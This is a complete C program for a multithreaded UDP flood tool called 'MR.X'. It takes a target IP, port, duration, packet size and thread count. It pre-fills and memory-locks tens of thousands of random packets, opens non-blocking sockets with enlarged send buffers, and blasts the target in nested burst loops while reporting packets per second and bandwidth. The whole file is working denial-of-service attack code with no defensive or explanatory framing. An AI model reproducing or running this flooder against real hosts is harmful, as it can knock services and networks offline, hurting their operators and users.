#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <sys/mman.h>

#define HYPER_LOOPS 280
#define INNER_LOOPS 140
#define EXTRA_BURST 28
#define BUFFER_ROTATION 3
#define PRE_ALLOC_COUNT 55000

char *TARGET_IP;
int TARGET_PORT;
int DURATION_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

volatile unsigned long long total_packets = 0;
volatile unsigned long long total_bytes = 0;
volatile int running = 1;
volatile int attack_started = 0;

pthread_t monitor_tid;
pthread_mutex_t start_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t start_cond = PTHREAD_COND_INITIALIZER;

char **packet_pool = NULL;

void init_packet_pool() {
    packet_pool = malloc(PRE_ALLOC_COUNT * sizeof(char*));
    for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
        packet_pool[i] = malloc(PACKET_SIZE);
        for(int j = 0; j < PACKET_SIZE; j++) {
            packet_pool[i][j] = rand() % 256;
        }
        mlock(packet_pool[i], PACKET_SIZE);
    }
}

void cleanup_pool() {
    for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
        if(packet_pool[i]) free(packet_pool[i]);
    }
    free(packet_pool);
}

void print_k_format(unsigned long long value, char *buffer) {
    if (value < 1000) sprintf(buffer, "%llu", value);
    else if (value < 1000000) sprintf(buffer, "%.0fK", value/1000.0);
    else sprintf(buffer, "%.1fM", value/1000000.0);
}

void* monitor_stats(void* arg) {
    unsigned long long last_packets = 0, last_bytes = 0;
    time_t start_time = time(NULL);
    
    while (running) {
        sleep(1);
        
        unsigned long long curr_packets = total_packets;
        unsigned long long curr_bytes = total_bytes;
        time_t elapsed = time(NULL) - start_time;
        
        unsigned long long pps = curr_packets - last_packets;
        unsigned long long bps = (curr_bytes - last_bytes) * 8;
        double mbps = bps / 1000000.0;
        unsigned long long avg_pps = elapsed > 0 ? curr_packets / elapsed : 0;
        
        char pps_str[32], total_str[32], avg_pps_str[32];
        print_k_format(pps, pps_str);
        print_k_format(curr_packets, total_str);
        print_k_format(avg_pps, avg_pps_str);
        
        fprintf(stderr, "MR.X 🔥: %s pk | %s p | %s A | %.0f M | X | 0 e\n",
                total_str, pps_str, avg_pps_str, mbps);
        
        last_packets = curr_packets;
        last_bytes = curr_bytes;
    }
    return NULL;
}

void* attack_thread(void* arg) {
    int thread_id = *(int*)arg;
    
    pthread_mutex_lock(&start_mutex);
    while (!attack_started) {
        pthread_cond_wait(&start_cond, &start_mutex);
    }
    pthread_mutex_unlock(&start_mutex);
    
    int socks[BUFFER_ROTATION];
    struct sockaddr_in target;
    
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(TARGET_PORT);
    target.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    for(int s = 0; s < BUFFER_ROTATION; s++) {
        socks[s] = socket(AF_INET, SOCK_DGRAM, 0);
        int broadcast = 1;
        int sndbuf = 400 * 1024 * 1024;
        setsockopt(socks[s], SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
        setsockopt(socks[s], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        setsockopt(socks[s], SOL_SOCKET, SO_REUSEADDR, &broadcast, sizeof(broadcast));
        fcntl(socks[s], F_SETFL, O_NONBLOCK);
    }
    
    int local_pool_index = thread_id % PRE_ALLOC_COUNT;
    int socket_rotate = 0;
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    
    time_t start = time(NULL);
    
    while (running && (time(NULL) - start) < DURATION_TIME) {
        for (int mega_burst = 0; mega_burst < HYPER_LOOPS; mega_burst++) {
            int current_sock = socks[socket_rotate % BUFFER_ROTATION];
            
            sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE, 
                   MSG_DONTWAIT, (struct sockaddr *)&target, sizeof(target));
            local_packets++;
            local_bytes += PACKET_SIZE;
            local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
            socket_rotate++;
            
            sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                   MSG_DONTWAIT, (struct sockaddr *)&target, sizeof(target));
            local_packets++;
            local_bytes += PACKET_SIZE;
            local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
            socket_rotate++;
            
            for (int i = 0; i < INNER_LOOPS; i++) {
                current_sock = socks[socket_rotate % BUFFER_ROTATION];
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&target, sizeof(target));
                local_packets++;
                local_bytes += PACKET_SIZE;
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&target, sizeof(target));
                local_packets++;
                local_bytes += PACKET_SIZE;
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
            }
            
            for (int extra = 0; extra < EXTRA_BURST; extra++) {
                current_sock = socks[socket_rotate % BUFFER_ROTATION];
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&target, sizeof(target));
                local_packets++;
                local_bytes += PACKET_SIZE;
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&target, sizeof(target));
                local_packets++;
                local_bytes += PACKET_SIZE;
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
            }
        }
        
        if (local_packets >= 50000) {
            __sync_fetch_and_add(&total_packets, local_packets);
            __sync_fetch_and_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
    }
    
    if (local_packets > 0) {
        __sync_fetch_and_add(&total_packets, local_packets);
        __sync_fetch_and_add(&total_bytes, local_bytes);
    }
    
    for(int s = 0; s < BUFFER_ROTATION; s++) {
        close(socks[s]);
    }
    
    return NULL;
}

int validate_ip(const char* ip) {
    struct in_addr addr;
    return inet_pton(AF_INET, ip, &addr) == 1;
}

int main(int argc, char* argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Use: ./mrx IP PORT TIME SIZE THREADS\n");
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    DURATION_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (!validate_ip(TARGET_IP) || TARGET_PORT == 0) {
        fprintf(stderr, "Error: Invalid values\n");
        return 1;
    }
    
    fprintf(stderr, "MR.X Started 🔥🔥🔥\n");
    
    srand(time(NULL));
    init_packet_pool();
    
    pthread_create(&monitor_tid, NULL, monitor_stats, NULL);
    
    pthread_t* threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int* thread_ids = malloc(THREAD_COUNT * sizeof(int));
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        thread_ids[i] = i;
        pthread_create(&threads[i], NULL, attack_thread, &thread_ids[i]);
    }
    
    sleep(1);
    
    pthread_mutex_lock(&start_mutex);
    attack_started = 1;
    pthread_cond_broadcast(&start_cond);
    pthread_mutex_unlock(&start_mutex);
    
    sleep(DURATION_TIME);
    running = 0;
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(monitor_tid, NULL);
    
    double avg_pps = (double)total_packets / DURATION_TIME;
    double avg_mbps = (total_bytes * 8.0) / (DURATION_TIME * 1000000.0);
    
    char total_str[32], pps_str[32], avg_pps_str[32];
    print_k_format(total_packets, total_str);
    print_k_format((unsigned long long)avg_pps, pps_str);
    print_k_format((unsigned long long)avg_pps, avg_pps_str);
    
    fprintf(stderr, "MR.X 🔥: %s pk | %s p | %s A | %.0f M | X | 0 e\n",
            total_str, pps_str, avg_pps_str, avg_mbps);
    
    fprintf(stderr, "MR.X Completed 🔥🔥🔥\n");
    
    cleanup_pool();
    free(threads);
    free(thread_ids);
    
    return 0;
}